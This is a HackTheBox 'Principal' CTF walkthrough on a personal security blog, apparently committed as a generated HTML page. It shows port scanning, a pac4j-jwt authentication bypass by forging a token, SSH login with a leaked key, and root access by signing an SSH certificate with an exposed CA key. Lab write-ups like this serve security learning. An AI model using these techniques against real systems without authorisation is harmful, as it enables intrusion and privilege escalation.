@@ -1,0 +1,353 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Principal - CTF Writeup | zerrox&#39; security blog</title>
+  <meta name="author" content="zerrox9">
+  
+  <meta name="description" content="Writeup for Principal CTF.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Principal - CTF Writeup"/>
+  <meta property="og:site_name" content="zerrox&#39; security blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/project/atom.xml" title="zerrox&#39; security blog" type="application/atom+xml">
+  
+  
+    <link href="/project/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/project/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/project/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/project/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/project/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/project/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/project/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/project/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/project/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/project/">zerrox&#39; security blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/project/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project/atom.xml" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Principal - CTF Writeup</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  
+		 <div class="alert alert-success description">
+			<i class="fa fa-info-circle"></i> Writeup for Principal CTF.
+		 </div> <!-- alert -->
+	  		
+
+	  <h1 id="Principal-CTF-Writeup"><a href="#Principal-CTF-Writeup" class="headerlink" title="Principal - CTF Writeup"></a>Principal - CTF Writeup</h1><h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><p>The initial port scan showed only two exposed services: SSH and a Jetty-based web application on port <code>8080</code>.</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-28 09:52 -0400</span><br><span class="line">Nmap scan report for 10.129.244.220</span><br><span class="line">Host is up (0.012s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">8080/tcp open  http-proxy Jetty</span><br></pre></td></tr></table></figure>
+
+<p>The HTTP service redirected to <code>/login</code> and exposed an interesting application header:</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">302</span> Found</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Jetty</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>pac4j-jwt/6.0.3</span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>/login</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>22/tcp</code></td>
+<td>SSH</td>
+<td>OpenSSH 9.6p1 on Ubuntu</td>
+</tr>
+<tr>
+<td><code>8080/tcp</code></td>
+<td>HTTP &#x2F; Jetty</td>
+<td>Login page with <code>pac4j-jwt/6.0.3</code> header</td>
+</tr>
+</tbody></table>
+<h2 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a>Web Enumeration</h2><p>After checking the visible application and finding no obvious path forward, the <code>X-Powered-By</code> header became the main lead:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Powered-By: pac4j-jwt/6.0.3</span><br></pre></td></tr></table></figure>
+
+<p>Searching for this version led to a public writeup about a pac4j JWT authentication bypass:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.codeant.ai/security-research/pac4j-jwt-authentication-bypass-public-key</span><br></pre></td></tr></table></figure>
+
+<p>The application also exposed useful client-side logic in:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/static/app.js</span><br></pre></td></tr></table></figure>
+
+<p>That JavaScript file contained the public key needed for token forging. At first, the forged token still did not grant access because I missed one important detail in the frontend auth flow: the token had to be placed in session storage as <code>auth_token</code>.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">sessionStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;auth_token&quot;</span>, token);</span><br></pre></td></tr></table></figure>
+
+<p>Once the forged JWT was stored in the expected place, the application accepted it.</p>
+<h2 id="Initial-Access"><a href="#Initial-Access" class="headerlink" title="Initial Access"></a>Initial Access</h2><p>The application revealed an encryption key:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D3pl0y_$$H_Now42!</span><br></pre></td></tr></table></figure>
+
+<p>Using that key, I was able to authenticate over SSH as <code>svc-deploy</code>.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh svc-deploy@10.129.244.220</span><br></pre></td></tr></table></figure>
+
+<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>After logging in, group enumeration showed that <code>svc-deploy</code> was a member of the <code>deployers</code> group:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">groups</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deployers</span><br></pre></td></tr></table></figure>
+
+<p>Files owned by the <code>deployers</code> group revealed a custom SSH certificate setup:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -group deployers -<span class="built_in">ls</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/etc/ssh/sshd_config.d/60-principal.conf</span><br><span class="line">/opt/principal/ssh</span><br><span class="line">/opt/principal/ssh/README.txt</span><br><span class="line">/opt/principal/ssh/ca</span><br></pre></td></tr></table></figure>
+
+<p>The important finding was the SSH certificate authority key at:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/opt/principal/ssh/ca</span><br></pre></td></tr></table></figure>
+
+<p>Because the current user could access the CA key, I could sign my own SSH key and create a certificate valid for the <code>root</code> principal.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">ssh-keygen -t ed25519 -f ./pwn -N <span class="string">&quot;&quot;</span> -C pwn</span><br><span class="line">ssh-keygen -s /opt/principal/ssh/ca -I pwn-root -n root -V +10m ./pwn.pub</span><br><span class="line">ssh -i ./pwn -o CertificateFile=./pwn-cert.pub root@localhost</span><br></pre></td></tr></table></figure>
+
+<p>That certificate was accepted by SSH, giving a root shell.</p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/project/2026/06/04/2026-06-04-silentium/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/project/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/project/2026/05/08/2026-05-08-Web-Attacks-Skill-Assessment/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2026-05-31 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/project/categories/hackthebox/">hackthebox<span>6</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/project/tags/hackthebox/">hackthebox<span>6</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2026 zerrox9's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/project/js/jquery.imagesloaded.min.js"></script>
+<script src="/project/js/gallery.js"></script>
+<script src="/project/js/bootstrap.min.js"></script>
+<script src="/project/js/main.js"></script>
+<script src="/project/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/project/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/project/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/project/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
